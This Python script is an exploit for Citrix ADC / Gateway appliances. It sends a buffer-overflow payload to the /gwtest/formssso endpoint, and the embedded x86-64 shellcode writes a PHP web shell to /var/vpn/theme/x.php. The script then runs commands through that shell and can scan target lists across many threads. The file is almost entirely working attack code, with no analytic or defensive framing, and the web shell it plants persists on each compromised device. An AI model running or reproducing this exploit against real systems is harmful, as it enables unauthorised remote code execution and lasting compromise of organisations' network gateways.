import re
import ssl
import socket
import urllib3
import requests
import argparse

from rich.console import Console
from urllib.parse import urlparse
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor


console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('--target', help='Single Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)')
parser.add_argument('--file', help='File containing a list of targets')
parser.add_argument('--output', help='Output file for vulnerable URLs', default='vulnerable_urls.txt')
parser.add_argument('--threads', help='Number of threads to use', type=int, default=4)
args = parser.parse_args()


def exploit_target(hostname_port, output, bar=None):
    hostname, port = hostname_port

    command_display = "id"
    command = f"echo -n [; echo -n S]; {command_display}; echo [E]"
    shellcode  = b''
    shellcode += b'/var/vpn/theme/x.php\x00'       # 21 bytes
    shellcode += b'AAAAAAAAAAAAA'                  # 13 bytes
    shellcode += b'<?php+system($_GET[0]);+?>\x00' # 27 bytes

    # open syscall
    shellcode += b'\x48\x89\xe7'                   # mov rdi, rsp 
    shellcode += b'\x48\x81\xef\xb0\x00\x00\x00'   # sub rdi, 0xb0
    shellcode += b'\xbe\x01\x02\x00\x00'           # mov esi, 0x201
    shellcode += b'\xba\xff\x01\x00\x00'           # mov edx, 0x1ff
    shellcode += b'\xb8\x05\x00\x00\x00'           # mov eax, 0x5
    shellcode += b'\x0f\x05'                       # syscall

    # write syscall
    shellcode += b'\x48\x89\xc7'                   # mov rdi, rax
    shellcode += b'\x48\x89\xe6'                   # mov rsi, rsp
    shellcode += b'\x48\x81\xee\x8e\x00\x00\x00'   # sub rsi, 0x8e
    shellcode += b'\xba\x1a\x00\x00\x00'           # mov edx, 0x1a
    shellcode += b'\xb8\x04\x00\x00\x00'           # mov eax, 0x4
    shellcode += b'\x0f\x05'                       # syscall

    # close syscall
    shellcode += b'\xb8\x06\x00\x00\x00'           # mov rax, 0x6
    shellcode += b'\x0f\x05'                       # syscall

    # cleanup
    shellcode += b'\x48\x83\xC4\x30'               # add rsp, 0x30
    shellcode += b'\x5d'                           # pop rbp
    shellcode += b'\xc3'                           # ret

    shellcode_encoded = tweaked_url_encode(shellcode)

    return_address = b'\x6d\xc1\xff\xff\xff\x7f\x00\x00'
    return_address_encoded = tweaked_url_encode(return_address)

    padding = b'A' * (168 - len(shellcode))
    payload = shellcode_encoded + padding + return_address_encoded

    request  = b''
    request += b'GET /gwtest/formssso?event=start&target='
    request += payload
    request += f' HTTP/1.1\r\nHost: {hostname}\r\n\r\n'.encode('utf-8')
    
    
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        #context.options |= 0x4
        sock = socket.create_connection((hostname, int(port)))
        
        ssock = context.wrap_socket(sock, server_hostname=hostname)
        ssock.settimeout(20)
        ssock.send(request)
        ssock.close()
        sock.close()
        
        r = requests.get(f'https://{hostname}:{port}/vpn/theme/x.php?0={command}', verify=False, timeout=20)

        
        match = re.search(r'\[S\](.*?)\[E\]', r.text, re.DOTALL)
        
        if match:
            command_output = match.group(1)
            console.print(f'[bold red][+] Vulnerable URL: https://{hostname}:{port}[/bold red]\n[bold green][-] Command Output:[/bold green][bold yellow] {command_output}[/bold yellow]')
            with open(output, 'a') as f:
                f.write(f"https://{hostname}:{port}" + "\n")
                
        elif not args.file:
            print('[+] Connected: ' + ssock.version())
            print('[+] Sent payload')
            print(f'[+] Running "{command_display}"')
            print(f'[+] {command_output}')
    
    except Exception as e:
        #print(e)
        if not output:
            print(f'[-] Connection to {hostname} timed out')
    
    finally:
        
        if bar:
            bar()
    
def tweaked_url_encode(payload):
    bytes_to_encode = b'\x00\x30\x90'
    encoded = bytearray(b'')
    for byte in payload:
        if byte in bytes_to_encode:
            encoded.extend('%{:02X}'.format(byte).encode('utf-8'))
        else:
            encoded.append(byte)
    return bytes(encoded)

def parse_url(url):
    parsed = urlparse(url)
    if not parsed.netloc and not parsed.scheme: 
        parts = url.split(":")
        return parts[0], int(parts[1]) if len(parts) > 1 else 443
    return parsed.hostname, parsed.port if parsed.port else 443

def main():
    if args.target:
        hostname, port = parse_url(args.target)
        exploit_target((hostname, port), None) 
    elif args.file:
        with open(args.file, 'r') as file:
            targets = [parse_url(line.strip()) for line in file.readlines()]
            with alive_bar(len(targets), title="Scanning") as bar:
                with ThreadPoolExecutor(max_workers=args.threads) as executor:
                    results = list(executor.map(lambda target: exploit_target(target, args.output, bar), targets))




if __name__ == "__main__":
    main()